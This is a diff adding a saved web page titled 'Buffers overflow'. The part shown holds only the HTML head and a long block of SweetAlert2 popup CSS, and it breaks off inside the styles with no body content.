@@ -1,0 +1,1380 @@
+<!DOCTYPE html>
+<!-- saved from url=(0018)https://guif.re/bo -->
+<html><head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
+        <title>Buffers overflow</title>
+        
+        <link rel="stylesheet" type="text/css" href="./Buffers overflow_files/main.css">
+        <link rel="icon" type="image/png" sizes="32x32" href="https://guif.re/assets/favicon.png">
+        <script async="" src="./Buffers overflow_files/analytics.js.download"></script><script src="./Buffers overflow_files/syntaxhighlighter.js.download"></script>
+    <style>@-webkit-keyframes swal2-show {
+  0% {
+    -webkit-transform: scale(0.7);
+            transform: scale(0.7); }
+  45% {
+    -webkit-transform: scale(1.05);
+            transform: scale(1.05); }
+  80% {
+    -webkit-transform: scale(0.95);
+            transform: scale(0.95); }
+  100% {
+    -webkit-transform: scale(1);
+            transform: scale(1); } }
+
+@keyframes swal2-show {
+  0% {
+    -webkit-transform: scale(0.7);
+            transform: scale(0.7); }
+  45% {
+    -webkit-transform: scale(1.05);
+            transform: scale(1.05); }
+  80% {
+    -webkit-transform: scale(0.95);
+            transform: scale(0.95); }
+  100% {
+    -webkit-transform: scale(1);
+            transform: scale(1); } }
+
+@-webkit-keyframes swal2-hide {
+  0% {
+    -webkit-transform: scale(1);
+            transform: scale(1);
+    opacity: 1; }
+  100% {
+    -webkit-transform: scale(0.5);
+            transform: scale(0.5);
+    opacity: 0; } }
+
+@keyframes swal2-hide {
+  0% {
+    -webkit-transform: scale(1);
+            transform: scale(1);
+    opacity: 1; }
+  100% {
+    -webkit-transform: scale(0.5);
+            transform: scale(0.5);
+    opacity: 0; } }
+
+@-webkit-keyframes swal2-animate-success-line-tip {
+  0% {
+    top: 1.1875em;
+    left: .0625em;
+    width: 0; }
+  54% {
+    top: 1.0625em;
+    left: .125em;
+    width: 0; }
+  70% {
+    top: 2.1875em;
+    left: -.375em;
+    width: 3.125em; }
+  84% {
+    top: 3em;
+    left: 1.3125em;
+    width: 1.0625em; }
+  100% {
+    top: 2.8125em;
+    left: .875em;
+    width: 1.5625em; } }
+
+@keyframes swal2-animate-success-line-tip {
+  0% {
+    top: 1.1875em;
+    left: .0625em;
+    width: 0; }
+  54% {
+    top: 1.0625em;
+    left: .125em;
+    width: 0; }
+  70% {
+    top: 2.1875em;
+    left: -.375em;
+    width: 3.125em; }
+  84% {
+    top: 3em;
+    left: 1.3125em;
+    width: 1.0625em; }
+  100% {
+    top: 2.8125em;
+    left: .875em;
+    width: 1.5625em; } }
+
+@-webkit-keyframes swal2-animate-success-line-long {
+  0% {
+    top: 3.375em;
+    right: 2.875em;
+    width: 0; }
+  65% {
+    top: 3.375em;
+    right: 2.875em;
+    width: 0; }
+  84% {
+    top: 2.1875em;
+    right: 0;
+    width: 3.4375em; }
+  100% {
+    top: 2.375em;
+    right: .5em;
+    width: 2.9375em; } }
+
+@keyframes swal2-animate-success-line-long {
+  0% {
+    top: 3.375em;
+    right: 2.875em;
+    width: 0; }
+  65% {
+    top: 3.375em;
+    right: 2.875em;
+    width: 0; }
+  84% {
+    top: 2.1875em;
+    right: 0;
+    width: 3.4375em; }
+  100% {
+    top: 2.375em;
+    right: .5em;
+    width: 2.9375em; } }
+
+@-webkit-keyframes swal2-rotate-success-circular-line {
+  0% {
+    -webkit-transform: rotate(-45deg);
+            transform: rotate(-45deg); }
+  5% {
+    -webkit-transform: rotate(-45deg);
+            transform: rotate(-45deg); }
+  12% {
+    -webkit-transform: rotate(-405deg);
+            transform: rotate(-405deg); }
+  100% {
+    -webkit-transform: rotate(-405deg);
+            transform: rotate(-405deg); } }
+
+@keyframes swal2-rotate-success-circular-line {
+  0% {
+    -webkit-transform: rotate(-45deg);
+            transform: rotate(-45deg); }
+  5% {
+    -webkit-transform: rotate(-45deg);
+            transform: rotate(-45deg); }
+  12% {
+    -webkit-transform: rotate(-405deg);
+            transform: rotate(-405deg); }
+  100% {
+    -webkit-transform: rotate(-405deg);
+            transform: rotate(-405deg); } }
+
+@-webkit-keyframes swal2-animate-error-x-mark {
+  0% {
+    margin-top: 1.625em;
+    -webkit-transform: scale(0.4);
+            transform: scale(0.4);
+    opacity: 0; }
+  50% {
+    margin-top: 1.625em;
+    -webkit-transform: scale(0.4);
+            transform: scale(0.4);
+    opacity: 0; }
+  80% {
+    margin-top: -.375em;
+    -webkit-transform: scale(1.15);
+            transform: scale(1.15); }
+  100% {
+    margin-top: 0;
+    -webkit-transform: scale(1);
+            transform: scale(1);
+    opacity: 1; } }
+
+@keyframes swal2-animate-error-x-mark {
+  0% {
+    margin-top: 1.625em;
+    -webkit-transform: scale(0.4);
+            transform: scale(0.4);
+    opacity: 0; }
+  50% {
+    margin-top: 1.625em;
+    -webkit-transform: scale(0.4);
+            transform: scale(0.4);
+    opacity: 0; }
+  80% {
+    margin-top: -.375em;
+    -webkit-transform: scale(1.15);
+            transform: scale(1.15); }
+  100% {
+    margin-top: 0;
+    -webkit-transform: scale(1);
+            transform: scale(1);
+    opacity: 1; } }
+
+@-webkit-keyframes swal2-animate-error-icon {
+  0% {
+    -webkit-transform: rotateX(100deg);
+            transform: rotateX(100deg);
+    opacity: 0; }
+  100% {
+    -webkit-transform: rotateX(0deg);
+            transform: rotateX(0deg);
+    opacity: 1; } }
+
+@keyframes swal2-animate-error-icon {
+  0% {
+    -webkit-transform: rotateX(100deg);
+            transform: rotateX(100deg);
+    opacity: 0; }
+  100% {
+    -webkit-transform: rotateX(0deg);
+            transform: rotateX(0deg);
+    opacity: 1; } }
+
+body.swal2-toast-shown.swal2-has-input > .swal2-container > .swal2-toast {
+  flex-direction: column;
+  align-items: stretch; }
+  body.swal2-toast-shown.swal2-has-input > .swal2-container > .swal2-toast .swal2-actions {
+    flex: 1;
+    align-self: stretch;
+    justify-content: flex-end;
+    height: 2.2em; }
+  body.swal2-toast-shown.swal2-has-input > .swal2-container > .swal2-toast .swal2-loading {
+    justify-content: center; }
+  body.swal2-toast-shown.swal2-has-input > .swal2-container > .swal2-toast .swal2-input {
+    height: 2em;
+    margin: .3125em auto;
+    font-size: 1em; }
+  body.swal2-toast-shown.swal2-has-input > .swal2-container > .swal2-toast .swal2-validationerror {
+    font-size: 1em; }
+
+body.swal2-toast-shown > .swal2-container {
+  position: fixed;
+  background-color: transparent; }
+  body.swal2-toast-shown > .swal2-container.swal2-shown {
+    background-color: transparent; }
+  body.swal2-toast-shown > .swal2-container.swal2-top {
+    top: 0;
+    right: auto;
+    bottom: auto;
+    left: 50%;
+    -webkit-transform: translateX(-50%);
+            transform: translateX(-50%); }
+  body.swal2-toast-shown > .swal2-container.swal2-top-end, body.swal2-toast-shown > .swal2-container.swal2-top-right {
+    top: 0;
+    right: 0;
+    bottom: auto;
+    left: auto; }
+  body.swal2-toast-shown > .swal2-container.swal2-top-start, body.swal2-toast-shown > .swal2-container.swal2-top-left {
+    top: 0;
+    right: auto;
+    bottom: auto;
+    left: 0; }
+  body.swal2-toast-shown > .swal2-container.swal2-center-start, body.swal2-toast-shown > .swal2-container.swal2-center-left {
+    top: 50%;
+    right: auto;
+    bottom: auto;
+    left: 0;
+    -webkit-transform: translateY(-50%);
+            transform: translateY(-50%); }
+  body.swal2-toast-shown > .swal2-container.swal2-center {
+    top: 50%;
+    right: auto;
+    bottom: auto;
+    left: 50%;
+    -webkit-transform: translate(-50%, -50%);
+            transform: translate(-50%, -50%); }
+  body.swal2-toast-shown > .swal2-container.swal2-center-end, body.swal2-toast-shown > .swal2-container.swal2-center-right {
+    top: 50%;
+    right: 0;
+    bottom: auto;
+    left: auto;
+    -webkit-transform: translateY(-50%);
+            transform: translateY(-50%); }
+  body.swal2-toast-shown > .swal2-container.swal2-bottom-start, body.swal2-toast-shown > .swal2-container.swal2-bottom-left {
+    top: auto;
+    right: auto;
+    bottom: 0;
+    left: 0; }
+  body.swal2-toast-shown > .swal2-container.swal2-bottom {
+    top: auto;
+    right: auto;
+    bottom: 0;
+    left: 50%;
+    -webkit-transform: translateX(-50%);
+            transform: translateX(-50%); }
+  body.swal2-toast-shown > .swal2-container.swal2-bottom-end, body.swal2-toast-shown > .swal2-container.swal2-bottom-right {
+    top: auto;
+    right: 0;
+    bottom: 0;
+    left: auto; }
+
+.swal2-popup.swal2-toast {
+  flex-direction: row;
+  align-items: center;
+  width: auto;
+  padding: 0.625em;
+  box-shadow: 0 0 0.625em #d9d9d9;
+  overflow-y: hidden; }
+  .swal2-popup.swal2-toast .swal2-header {
+    flex-direction: row; }
+  .swal2-popup.swal2-toast .swal2-title {
+    justify-content: flex-start;
+    margin: 0 .6em;
+    font-size: 1em; }
+  .swal2-popup.swal2-toast .swal2-close {
+    position: initial; }
+  .swal2-popup.swal2-toast .swal2-content {
+    justify-content: flex-start;
+    font-size: 1em; }
+  .swal2-popup.swal2-toast .swal2-icon {
+    width: 2em;
+    min-width: 2em;
+    height: 2em;
+    margin: 0; }
+    .swal2-popup.swal2-toast .swal2-icon-text {
+      font-size: 2em;
+      font-weight: bold;
+      line-height: 1em; }
+    .swal2-popup.swal2-toast .swal2-icon.swal2-success .swal2-success-ring {
+      width: 2em;
+      height: 2em; }
+    .swal2-popup.swal2-toast .swal2-icon.swal2-error [class^='swal2-x-mark-line'] {
+      top: .875em;
+      width: 1.375em; }
+      .swal2-popup.swal2-toast .swal2-icon.swal2-error [class^='swal2-x-mark-line'][class$='left'] {
+        left: .3125em; }
+      .swal2-popup.swal2-toast .swal2-icon.swal2-error [class^='swal2-x-mark-line'][class$='right'] {
+        right: .3125em; }
+  .swal2-popup.swal2-toast .swal2-actions {
+    height: auto;
+    margin: 0 .3125em; }
+  .swal2-popup.swal2-toast .swal2-styled {
+    margin: 0 .3125em;
+    padding: .3125em .625em;
+    font-size: 1em; }
+    .swal2-popup.swal2-toast .swal2-styled:focus {
+      box-shadow: 0 0 0 0.0625em #fff, 0 0 0 0.125em rgba(50, 100, 150, 0.4); }
+  .swal2-popup.swal2-toast .swal2-success {
+    border-color: #a5dc86; }
+    .swal2-popup.swal2-toast .swal2-success [class^='swal2-success-circular-line'] {
+      position: absolute;
+      width: 2em;
+      height: 2.8125em;
+      -webkit-transform: rotate(45deg);
+              transform: rotate(45deg);
+      border-radius: 50%; }
+      .swal2-popup.swal2-toast .swal2-success [class^='swal2-success-circular-line'][class$='left'] {
+        top: -.25em;
+        left: -.9375em;
+        -webkit-transform: rotate(-45deg);
+                transform: rotate(-45deg);
+        -webkit-transform-origin: 2em 2em;
+                transform-origin: 2em 2em;
+        border-radius: 4em 0 0 4em; }
+      .swal2-popup.swal2-toast .swal2-success [class^='swal2-success-circular-line'][class$='right'] {
+        top: -.25em;
+        left: .9375em;
+        -webkit-transform-origin: 0 2em;
+                transform-origin: 0 2em;
+        border-radius: 0 4em 4em 0; }
+    .swal2-popup.swal2-toast .swal2-success .swal2-success-ring {
+      width: 2em;
+      height: 2em; }
+    .swal2-popup.swal2-toast .swal2-success .swal2-success-fix {
+      top: 0;
+      left: .4375em;
+      width: .4375em;
+      height: 2.6875em; }
+    .swal2-popup.swal2-toast .swal2-success [class^='swal2-success-line'] {
+      height: .3125em; }
+      .swal2-popup.swal2-toast .swal2-success [class^='swal2-success-line'][class$='tip'] {
+        top: 1.125em;
+        left: .1875em;
+        width: .75em; }
+      .swal2-popup.swal2-toast .swal2-success [class^='swal2-success-line'][class$='long'] {
+        top: .9375em;
+        right: .1875em;
+        width: 1.375em; }
+  .swal2-popup.swal2-toast.swal2-show {
+    -webkit-animation: showSweetToast .5s;
+            animation: showSweetToast .5s; }
+  .swal2-popup.swal2-toast.swal2-hide {
+    -webkit-animation: hideSweetToast .2s forwards;
+            animation: hideSweetToast .2s forwards; }
+  .swal2-popup.swal2-toast .swal2-animate-success-icon .swal2-success-line-tip {
+    -webkit-animation: animate-toast-success-tip .75s;
+            animation: animate-toast-success-tip .75s; }
+  .swal2-popup.swal2-toast .swal2-animate-success-icon .swal2-success-line-long {
+    -webkit-animation: animate-toast-success-long .75s;
+            animation: animate-toast-success-long .75s; }
+
+@-webkit-keyframes showSweetToast {
+  0% {
+    -webkit-transform: translateY(-0.625em) rotateZ(2deg);
+            transform: translateY(-0.625em) rotateZ(2deg);
+    opacity: 0; }
+  33% {
+    -webkit-transform: translateY(0) rotateZ(-2deg);
+            transform: translateY(0) rotateZ(-2deg);
+    opacity: .5; }
+  66% {
+    -webkit-transform: translateY(0.3125em) rotateZ(2deg);
+            transform: translateY(0.3125em) rotateZ(2deg);
+    opacity: .7; }
+  100% {
+    -webkit-transform: translateY(0) rotateZ(0);
+            transform: translateY(0) rotateZ(0);
+    opacity: 1; } }
+
+@keyframes showSweetToast {
+  0% {
+    -webkit-transform: translateY(-0.625em) rotateZ(2deg);
+            transform: translateY(-0.625em) rotateZ(2deg);
+    opacity: 0; }
+  33% {
+    -webkit-transform: translateY(0) rotateZ(-2deg);
+            transform: translateY(0) rotateZ(-2deg);
+    opacity: .5; }
+  66% {
+    -webkit-transform: translateY(0.3125em) rotateZ(2deg);
+            transform: translateY(0.3125em) rotateZ(2deg);
+    opacity: .7; }
+  100% {
+    -webkit-transform: translateY(0) rotateZ(0);
+            transform: translateY(0) rotateZ(0);
+    opacity: 1; } }
+
+@-webkit-keyframes hideSweetToast {
+  0% {
+    opacity: 1; }
+  33% {
+    opacity: .5; }
+  100% {
+    -webkit-transform: rotateZ(1deg);
+            transform: rotateZ(1deg);
+    opacity: 0; } }
+
+@keyframes hideSweetToast {
+  0% {
+    opacity: 1; }
+  33% {
+    opacity: .5; }
+  100% {
+    -webkit-transform: rotateZ(1deg);
+            transform: rotateZ(1deg);
+    opacity: 0; } }
+
+@-webkit-keyframes animate-toast-success-tip {
+  0% {
+    top: .5625em;
+    left: .0625em;
+    width: 0; }
+  54% {
+    top: .125em;
+    left: .125em;
+    width: 0; }
+  70% {
+    top: .625em;
+    left: -.25em;
+    width: 1.625em; }
+  84% {
+    top: 1.0625em;
+    left: .75em;
+    width: .5em; }
+  100% {
+    top: 1.125em;
+    left: .1875em;
+    width: .75em; } }
+
+@keyframes animate-toast-success-tip {
+  0% {
+    top: .5625em;
+    left: .0625em;
+    width: 0; }
+  54% {
+    top: .125em;
+    left: .125em;
+    width: 0; }
+  70% {
+    top: .625em;
+    left: -.25em;
+    width: 1.625em; }
+  84% {
+    top: 1.0625em;
+    left: .75em;
+    width: .5em; }
+  100% {
+    top: 1.125em;
+    left: .1875em;
+    width: .75em; } }
+
+@-webkit-keyframes animate-toast-success-long {
+  0% {
+    top: 1.625em;
+    right: 1.375em;
+    width: 0; }
+  65% {
+    top: 1.25em;
+    right: .9375em;
+    width: 0; }
+  84% {
+    top: .9375em;
+    right: 0;
+    width: 1.125em; }
+  100% {
+    top: .9375em;
+    right: .1875em;
+    width: 1.375em; } }
+
+@keyframes animate-toast-success-long {
+  0% {
+    top: 1.625em;
+    right: 1.375em;
+    width: 0; }
+  65% {
+    top: 1.25em;
+    right: .9375em;
+    width: 0; }
+  84% {
+    top: .9375em;
+    right: 0;
+    width: 1.125em; }
+  100% {
+    top: .9375em;
+    right: .1875em;
+    width: 1.375em; } }
+
+html.swal2-shown:not(.swal2-no-backdrop):not(.swal2-toast-shown),
+body.swal2-shown:not(.swal2-no-backdrop):not(.swal2-toast-shown) {
+  height: auto;
+  overflow-y: hidden; }
+
+body.swal2-no-backdrop .swal2-shown {
+  top: auto;
+  right: auto;
+  bottom: auto;
+  left: auto;
+  background-color: transparent; }
+  body.swal2-no-backdrop .swal2-shown > .swal2-modal {
+    box-shadow: 0 0 10px rgba(0, 0, 0, 0.4); }
+  body.swal2-no-backdrop .swal2-shown.swal2-top {
+    top: 0;
+    left: 50%;
+    -webkit-transform: translateX(-50%);
+            transform: translateX(-50%); }
+  body.swal2-no-backdrop .swal2-shown.swal2-top-start, body.swal2-no-backdrop .swal2-shown.swal2-top-left {
+    top: 0;
+    left: 0; }
+  body.swal2-no-backdrop .swal2-shown.swal2-top-end, body.swal2-no-backdrop .swal2-shown.swal2-top-right {
+    top: 0;
+    right: 0; }
+  body.swal2-no-backdrop .swal2-shown.swal2-center {
+    top: 50%;
+    left: 50%;
+    -webkit-transform: translate(-50%, -50%);
+            transform: translate(-50%, -50%); }
+  body.swal2-no-backdrop .swal2-shown.swal2-center-start, body.swal2-no-backdrop .swal2-shown.swal2-center-left {
+    top: 50%;
+    left: 0;
+    -webkit-transform: translateY(-50%);
+            transform: translateY(-50%); }
+  body.swal2-no-backdrop .swal2-shown.swal2-center-end, body.swal2-no-backdrop .swal2-shown.swal2-center-right {
+    top: 50%;
+    right: 0;
+    -webkit-transform: translateY(-50%);
+            transform: translateY(-50%); }
+  body.swal2-no-backdrop .swal2-shown.swal2-bottom {
+    bottom: 0;
+    left: 50%;
+    -webkit-transform: translateX(-50%);
+            transform: translateX(-50%); }
+  body.swal2-no-backdrop .swal2-shown.swal2-bottom-start, body.swal2-no-backdrop .swal2-shown.swal2-bottom-left {
+    bottom: 0;
+    left: 0; }
+  body.swal2-no-backdrop .swal2-shown.swal2-bottom-end, body.swal2-no-backdrop .swal2-shown.swal2-bottom-right {
+    right: 0;
+    bottom: 0; }
+
+.swal2-container {
+  display: flex;
+  position: fixed;
+  top: 0;
+  right: 0;
+  bottom: 0;
+  left: 0;
+  flex-direction: row;
+  align-items: center;
+  justify-content: center;
+  padding: 10px;
+  background-color: transparent;
+  z-index: 1060;
+  overflow-x: hidden;
+  -webkit-overflow-scrolling: touch; }
+  .swal2-container.swal2-top {
+    align-items: flex-start; }
+  .swal2-container.swal2-top-start, .swal2-container.swal2-top-left {
+    align-items: flex-start;
+    justify-content: flex-start; }
+  .swal2-container.swal2-top-end, .swal2-container.swal2-top-right {
+    align-items: flex-start;
+    justify-content: flex-end; }
+  .swal2-container.swal2-center {
+    align-items: center; }
+  .swal2-container.swal2-center-start, .swal2-container.swal2-center-left {
+    align-items: center;
+    justify-content: flex-start; }
+  .swal2-container.swal2-center-end, .swal2-container.swal2-center-right {
+    align-items: center;
+    justify-content: flex-end; }
+  .swal2-container.swal2-bottom {
+    align-items: flex-end; }
+  .swal2-container.swal2-bottom-start, .swal2-container.swal2-bottom-left {
+    align-items: flex-end;
+    justify-content: flex-start; }
+  .swal2-container.swal2-bottom-end, .swal2-container.swal2-bottom-right {
+    align-items: flex-end;
+    justify-content: flex-end; }
+  .swal2-container.swal2-grow-fullscreen > .swal2-modal {
+    display: flex !important;
+    flex: 1;
+    align-self: stretch;
+    justify-content: center; }
+  .swal2-container.swal2-grow-row > .swal2-modal {
+    display: flex !important;
+    flex: 1;
+    align-content: center;
+    justify-content: center; }
+  .swal2-container.swal2-grow-column {
+    flex: 1;
+    flex-direction: column; }
+    .swal2-container.swal2-grow-column.swal2-top, .swal2-container.swal2-grow-column.swal2-center, .swal2-container.swal2-grow-column.swal2-bottom {
+      align-items: center; }
+    .swal2-container.swal2-grow-column.swal2-top-start, .swal2-container.swal2-grow-column.swal2-center-start, .swal2-container.swal2-grow-column.swal2-bottom-start, .swal2-container.swal2-grow-column.swal2-top-left, .swal2-container.swal2-grow-column.swal2-center-left, .swal2-container.swal2-grow-column.swal2-bottom-left {
+      align-items: flex-start; }
+    .swal2-container.swal2-grow-column.swal2-top-end, .swal2-container.swal2-grow-column.swal2-center-end, .swal2-container.swal2-grow-column.swal2-bottom-end, .swal2-container.swal2-grow-column.swal2-top-right, .swal2-container.swal2-grow-column.swal2-center-right, .swal2-container.swal2-grow-column.swal2-bottom-right {
+      align-items: flex-end; }
+    .swal2-container.swal2-grow-column > .swal2-modal {
+      display: flex !important;
+      flex: 1;
+      align-content: center;
+      justify-content: center; }
+  .swal2-container:not(.swal2-top):not(.swal2-top-start):not(.swal2-top-end):not(.swal2-top-left):not(.swal2-top-right):not(.swal2-center-start):not(.swal2-center-end):not(.swal2-center-left):not(.swal2-center-right):not(.swal2-bottom):not(.swal2-bottom-start):not(.swal2-bottom-end):not(.swal2-bottom-left):not(.swal2-bottom-right) > .swal2-modal {
+    margin: auto; }
+  @media all and (-ms-high-contrast: none), (-ms-high-contrast: active) {
+    .swal2-container .swal2-modal {
+      margin: 0 !important; } }
+  .swal2-container.swal2-fade {
+    transition: background-color .1s; }
+  .swal2-container.swal2-shown {
+    background-color: rgba(0, 0, 0, 0.4); }
+
+.swal2-popup {
+  display: none;
+  position: relative;
+  flex-direction: column;
+  justify-content: center;
+  width: 32em;
+  max-width: 100%;
+  padding: 1.25em;
+  border-radius: 0.3125em;
+  background: #fff;
+  font-family: inherit;
+  font-size: 1rem;
+  box-sizing: border-box; }
+  .swal2-popup:focus {
+    outline: none; }
+  .swal2-popup.swal2-loading {
+    overflow-y: hidden; }
+  .swal2-popup .swal2-header {
+    display: flex;
+    flex-direction: column;
+    align-items: center; }
+  .swal2-popup .swal2-title {
+    display: block;
+    position: relative;
+    max-width: 100%;
+    margin: 0 0 0.4em;
+    padding: 0;
+    color: #595959;
+    font-size: 1.875em;
+    font-weight: 600;
+    text-align: center;
+    text-transform: none;
+    word-wrap: break-word; }
+  .swal2-popup .swal2-actions {
+    align-items: center;
+    justify-content: center;
+    margin: 1.25em auto 0; }
+    .swal2-popup .swal2-actions:not(.swal2-loading) .swal2-styled[disabled] {
+      opacity: .4; }
+    .swal2-popup .swal2-actions:not(.swal2-loading) .swal2-styled:hover {
+      background-image: linear-gradient(rgba(0, 0, 0, 0.1), rgba(0, 0, 0, 0.1)); }
+    .swal2-popup .swal2-actions:not(.swal2-loading) .swal2-styled:active {
+      background-image: linear-gradient(rgba(0, 0, 0, 0.2), rgba(0, 0, 0, 0.2)); }
+    .swal2-popup .swal2-actions.swal2-loading .swal2-styled.swal2-confirm {
+      width: 2.5em;
+      height: 2.5em;
+      margin: .46875em;
+      padding: 0;
+      border: .25em solid transparent;
+      border-radius: 100%;
+      border-color: transparent;
+      background-color: transparent !important;
+      color: transparent;
+      cursor: default;
+      box-sizing: border-box;
+      -webkit-animation: swal2-rotate-loading 1.5s linear 0s infinite normal;
+              animation: swal2-rotate-loading 1.5s linear 0s infinite normal;
+      -webkit-user-select: none;
+         -moz-user-select: none;
+          -ms-user-select: none;
+              user-select: none; }
+    .swal2-popup .swal2-actions.swal2-loading .swal2-styled.swal2-cancel {
+      margin-right: 30px;
+      margin-left: 30px; }
+    .swal2-popup .swal2-actions.swal2-loading :not(.swal2-styled).swal2-confirm::after {
+      display: inline-block;
+      width: 15px;
+      height: 15px;
+      margin-left: 5px;
+      border: 3px solid #999999;
+      border-radius: 50%;
+      border-right-color: transparent;
+      box-shadow: 1px 1px 1px #fff;
+      content: '';
+      -webkit-animation: swal2-rotate-loading 1.5s linear 0s infinite normal;
+              animation: swal2-rotate-loading 1.5s linear 0s infinite normal; }
+  .swal2-popup .swal2-styled {
+    margin: 0 .3125em;
+    padding: .625em 2em;
+    font-weight: 500;
+    box-shadow: none; }
+    .swal2-popup .swal2-styled:not([disabled]) {
+      cursor: pointer; }
+    .swal2-popup .swal2-styled.swal2-confirm {
+      border: 0;
+      border-radius: 0.25em;
+      background: initial;
+      background-color: #3085d6;
+      color: #fff;
+      font-size: 1.0625em; }
+    .swal2-popup .swal2-styled.swal2-cancel {
+      border: 0;
+      border-radius: 0.25em;
+      background: initial;
+      background-color: #aaa;
+      color: #fff;
+      font-size: 1.0625em; }
+    .swal2-popup .swal2-styled:focus {
+      outline: none;
+      box-shadow: 0 0 0 2px #fff, 0 0 0 4px rgba(50, 100, 150, 0.4); }
+    .swal2-popup .swal2-styled::-moz-focus-inner {
+      border: 0; }
+  .swal2-popup .swal2-footer {
+    justify-content: center;
+    margin: 1.25em 0 0;
+    padding-top: 1em;
+    border-top: 1px solid #eee;
+    color: #545454;
+    font-size: 1em; }
+  .swal2-popup .swal2-image {
+    max-width: 100%;
+    margin: 1.25em auto; }
+  .swal2-popup .swal2-close {
+    position: absolute;
+    top: 0;
+    right: 0;
+    justify-content: center;
+    width: 1.2em;
+    min-width: 1.2em;
+    height: 1.2em;
+    margin: 0;
+    padding: 0;
+    transition: color 0.1s ease-out;
+    border: none;
+    border-radius: 0;
+    background: transparent;
+    color: #cccccc;
+    font-family: serif;
+    font-size: calc(2.5em - 0.25em);
+    line-height: 1.2em;
+    cursor: pointer; }
+    .swal2-popup .swal2-close:hover {
+      -webkit-transform: none;
+              transform: none;
+      color: #f27474; }
+  .swal2-popup > .swal2-input,
+  .swal2-popup > .swal2-file,
+  .swal2-popup > .swal2-textarea,
+  .swal2-popup > .swal2-select,
+  .swal2-popup > .swal2-radio,
+  .swal2-popup > .swal2-checkbox {
+    display: none; }
+  .swal2-popup .swal2-content {
+    justify-content: center;
+    margin: 0;
+    padding: 0;
+    color: #545454;
+    font-size: 1.125em;
+    font-weight: 300;
+    line-height: normal;
+    word-wrap: break-word; }
+  .swal2-popup #swal2-content {
+    text-align: center; }
+  .swal2-popup .swal2-input,
+  .swal2-popup .swal2-file,
+  .swal2-popup .swal2-textarea,
+  .swal2-popup .swal2-select,
+  .swal2-popup .swal2-radio,
+  .swal2-popup .swal2-checkbox {
+    margin: 1em auto; }
+  .swal2-popup .swal2-input,
+  .swal2-popup .swal2-file,
+  .swal2-popup .swal2-textarea {
+    width: 100%;
+    transition: border-color .3s, box-shadow .3s;
+    border: 1px solid #d9d9d9;
+    border-radius: 0.1875em;
+    font-size: 1.125em;
+    box-shadow: inset 0 1px 1px rgba(0, 0, 0, 0.06);
+    box-sizing: border-box; }
+    .swal2-popup .swal2-input.swal2-inputerror,
+    .swal2-popup .swal2-file.swal2-inputerror,
+    .swal2-popup .swal2-textarea.swal2-inputerror {
+      border-color: #f27474 !important;
+      box-shadow: 0 0 2px #f27474 !important; }
+    .swal2-popup .swal2-input:focus,
+    .swal2-popup .swal2-file:focus,
+    .swal2-popup .swal2-textarea:focus {
+      border: 1px solid #b4dbed;
+      outline: none;
+      box-shadow: 0 0 3px #c4e6f5; }
+    .swal2-popup .swal2-input::-webkit-input-placeholder,
+    .swal2-popup .swal2-file::-webkit-input-placeholder,
+    .swal2-popup .swal2-textarea::-webkit-input-placeholder {
+      color: #cccccc; }
+    .swal2-popup .swal2-input:-ms-input-placeholder,
+    .swal2-popup .swal2-file:-ms-input-placeholder,
+    .swal2-popup .swal2-textarea:-ms-input-placeholder {
+      color: #cccccc; }
+    .swal2-popup .swal2-input::-ms-input-placeholder,
+    .swal2-popup .swal2-file::-ms-input-placeholder,
+    .swal2-popup .swal2-textarea::-ms-input-placeholder {
+      color: #cccccc; }
+    .swal2-popup .swal2-input::placeholder,
+    .swal2-popup .swal2-file::placeholder,
+    .swal2-popup .swal2-textarea::placeholder {
+      color: #cccccc; }
+  .swal2-popup .swal2-range input {
+    width: 80%; }
+  .swal2-popup .swal2-range output {
+    width: 20%;
+    font-weight: 600;
+    text-align: center; }
+  .swal2-popup .swal2-range input,
+  .swal2-popup .swal2-range output {
+    height: 2.625em;
+    margin: 1em auto;
+    padding: 0;
+    font-size: 1.125em;
+    line-height: 2.625em; }
+  .swal2-popup .swal2-input {
+    height: 2.625em;
+    padding: 0.75em; }
+    .swal2-popup .swal2-input[type='number'] {
+      max-width: 10em; }
+  .swal2-popup .swal2-file {
+    font-size: 1.125em; }
+  .swal2-popup .swal2-textarea {
+    height: 6.75em;
+    padding: 0.75em; }
+  .swal2-popup .swal2-select {
+    min-width: 50%;
+    max-width: 100%;
+    padding: .375em .625em;
+    color: #545454;
+    font-size: 1.125em; }
+  .swal2-popup .swal2-radio,
+  .swal2-popup .swal2-checkbox {
+    align-items: center;
+    justify-content: center; }
+    .swal2-popup .swal2-radio label,
+    .swal2-popup .swal2-checkbox label {
+      margin: 0 .6em;
+      font-size: 1.125em; }
+    .swal2-popup .swal2-radio input,
+    .swal2-popup .swal2-checkbox input {
+      margin: 0 .4em; }
+  .swal2-popup .swal2-validationerror {
+    display: none;
+    align-items: center;
+    justify-content: center;
+    padding: 0.625em;
+    background: #f0f0f0;
+    color: #666666;
+    font-size: 1em;
+    font-weight: 300;
+    overflow: hidden; }
+    .swal2-popup .swal2-validationerror::before {
+      display: inline-block;
+      width: 1.5em;
+      height: 1.5em;
+      margin: 0 .625em;
+      border-radius: 50%;
+      background-color: #f27474;
+      color: #fff;
+      font-weight: 600;
+      line-height: 1.5em;
+      text-align: center;
+      content: '!';
+      zoom: normal; }
+
+@supports (-ms-accelerator: true) {
+  .swal2-range input {
+    width: 100% !important; }
+  .swal2-range output {
+    display: none; } }
+
+@media all and (-ms-high-contrast: none), (-ms-high-contrast: active) {
+  .swal2-range input {
+    width: 100% !important; }
+  .swal2-range output {
+    display: none; } }
+
+.swal2-icon {
+  position: relative;
+  justify-content: center;
+  width: 5em;
+  height: 5em;
+  margin: 1.25em auto 1.875em;
+  border: .25em solid transparent;
+  border-radius: 50%;
+  line-height: 5em;
+  cursor: default;
+  box-sizing: content-box;
+  -webkit-user-select: none;
+     -moz-user-select: none;
+      -ms-user-select: none;
+          user-select: none;
+  zoom: normal; }
+  .swal2-icon-text {
+    font-size: 3.75em; }
+  .swal2-icon.swal2-error {
+    border-color: #f27474; }
+    .swal2-icon.swal2-error .swal2-x-mark {
+      position: relative;
+      flex-grow: 1; }
+    .swal2-icon.swal2-error [class^='swal2-x-mark-line'] {
+      display: block;
+      position: absolute;
+      top: 2.3125em;
+      width: 2.9375em;
+      height: .3125em;
+      border-radius: .125em;
+      background-color: #f27474; }
+      .swal2-icon.swal2-error [class^='swal2-x-mark-line'][class$='left'] {
+        left: 1.0625em;
+        -webkit-transform: rotate(45deg);
+                transform: rotate(45deg); }
+      .swal2-icon.swal2-error [class^='swal2-x-mark-line'][class$='right'] {
+        right: 1em;
+        -webkit-transform: rotate(-45deg);
+                transform: rotate(-45deg); }
+  .swal2-icon.swal2-warning {
+    border-color: #facea8;
+    color: #f8bb86; }
